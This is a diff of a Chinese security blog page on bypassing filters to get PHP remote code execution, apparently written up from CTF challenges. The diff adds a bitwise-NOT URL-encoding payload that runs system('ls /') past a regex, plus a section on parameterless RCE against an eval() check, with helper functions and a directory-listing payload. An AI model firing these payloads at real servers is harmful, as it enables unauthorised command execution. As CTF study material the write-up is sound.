@@ -27,7 +27,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http:\/\/localhost:1313\/posts\/%E5%85%B3%E4%BA%8Erce%E7%BB%95%E8%BF%87%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF\/"
-        },"genre": "posts","keywords": "RCE","wordcount":  856 ,
+        },"genre": "posts","keywords": "RCE","wordcount":  1669 ,
         "url": "http:\/\/localhost:1313\/posts\/%E5%85%B3%E4%BA%8Erce%E7%BB%95%E8%BF%87%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF\/","datePublished": "2024-03-04T15:08:47+08:00","dateModified": "2024-03-04T15:08:47+08:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -101,8 +101,8 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">关于RCE绕过的各种姿势</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Yul0ck</a></span>&nbsp;<span class="post-category">included in <a href="/categories/bypass/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Bypass</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-03-04">2024-03-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;856 words&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;2 minutes&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-03-04">2024-03-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1669 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
                     <span>Contents</span>
@@ -121,6 +121,12 @@
       </ul>
     </li>
     <li><a href="#无字母rce">无字母RCE</a></li>
+    <li><a href="#无参数rce">无参数RCE</a>
+      <ul>
+        <li><a href="#相关函数">相关函数</a></li>
+        <li><a href="#数组移动相关函数">数组移动相关函数</a></li>
+      </ul>
+    </li>
   </ul>
 </nav></div>
             </div><div class="content" id="content"><h2 id="闲话">闲话</h2>
@@ -218,7 +224,91 @@ shell=system
 </span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;蔡总说：注意审题！！！&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>写累了，下次写</p>
+</span></span></code></pre></div><p>解法：URL编码取反绕过正则</p>
+<p>原理：按二进制位取反后的字符基本都是不可见字符，所以不会触发正则匹配，在传参时再对其取反即可</p>
+<p>需要符号：<code>~</code>、<code>()</code></p>
+<p>exp如下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="s1">&#39;system&#39;</span><span class="p">);</span>    <span class="c1">//%8C%86%8C%8B%9A%92
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="s1">&#39;ls /&#39;</span><span class="p">);</span>    <span class="c1">//%93%8C%DF%D0
+</span></span></span></code></pre></div><p>构造payload</p>
+<pre tabindex="0"><code>?wllm=(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);
+</code></pre><p>即可实现RCE</p>
+<blockquote>
+<p>注意：此方法不可以将括号也一起取反，因此在注入时少不了括号</p>
+</blockquote>
+<h2 id="无参数rce">无参数RCE</h2>
+<p>一个很有趣的RCE姿势</p>
+<p>题目特征如下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="s1">&#39;;&#39;</span> <span class="o">===</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[^\W]+\((?R)?\)/&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;star&#39;</span><span class="p">]))</span> <span class="p">{</span>    
+</span></span><span class="line"><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;star&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>关键点在于<code>('/[^\W]+((?R)?\</code>这个正则表达式，改表达式替换后，每个函数内的参数都会被匹配</p>
+<h3 id="相关函数">相关函数</h3>
+<ul>
+<li>
+<p><code>scandir()</code>：返回当前目录中所有的文件和目录，结果是一个数组</p>
+</li>
+<li>
+<p><code>current()</code>与<code>pos()</code>：返回当前数组中的值（默认第一个）</p>
+</li>
+<li>
+<p><code>localeconv()</code>：返回本地数字及货币信息的数组（该数组的第一项是<code>.</code>，可以与<code>scandir</code>配合使用）</p>
+</li>
+<li>
+<p><code>getcwd()</code>：获取当前工作目录</p>
+</li>
+<li>
+<p><code>chdir()</code>：改变当前的目录</p>
+</li>
+<li>
+<p><code>dirname()</code>：对路径作操作，返回去掉文件名后的目录名（如<code>/test/index.php</code>返回<code>/test</code>）</p>
+</li>
+<li>
+<p><code>getallheaders()</code>：获取所有请求头信息，并返回键值对</p>
+</li>
+<li>
+<p><code>array_rand()</code>：随机返回一个键名</p>
+</li>
+<li>
+<p><code>array_flip()</code>：交换数组中的键与值，返回交换后的数组</p>
+</li>
+<li>
+<p><code>array_reverse()</code>：以相反的顺序返回数组内容</p>
+</li>
+<li>
+<p><code>strrev()</code>：返回反转后的字符串</p>
+</li>
+<li>
+<p><code>eval()</code>与<code>assert()</code>：命令执行</p>
+</li>
+<li>
+<p><code>highlight_file()</code>、<code>show_source()</code>、<code>read_file()</code>：读取文件内容</p>
+</li>
+</ul>
+<p>举个栗子：<code>scandir('.')</code>用于返回当前目录，在无法传参数的情况下，可以用<code>localeconv()</code>构造一个<code>.</code>，再用<code>current()</code>返回<code>.</code>给<code>scandir()</code>即可</p>
+<blockquote>
+<p>?payload=var_dump(scandir(current(localeconv())));</p>
+</blockquote>
+<h3 id="数组移动相关函数">数组移动相关函数</h3>
+<ul>
+<li>
+<p><code>end()</code>：内部指针指向数组中最后一个元素并输出</p>
+</li>
+<li>
+<p><code>next()</code>：指向下一个元素并输出</p>
+</li>
+<li>
+<p><code>prev()</code>：指向上一个元素并输出</p>
+</li>
+<li>
+<p><code>reset()</code>：指向数组中第一个元素并输出</p>
+</li>
+<li>
+<p><code>each()</code>：返回当前元素的键名和键值，并将内部指针向前移动</p>
+</li>
+</ul>
 </div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
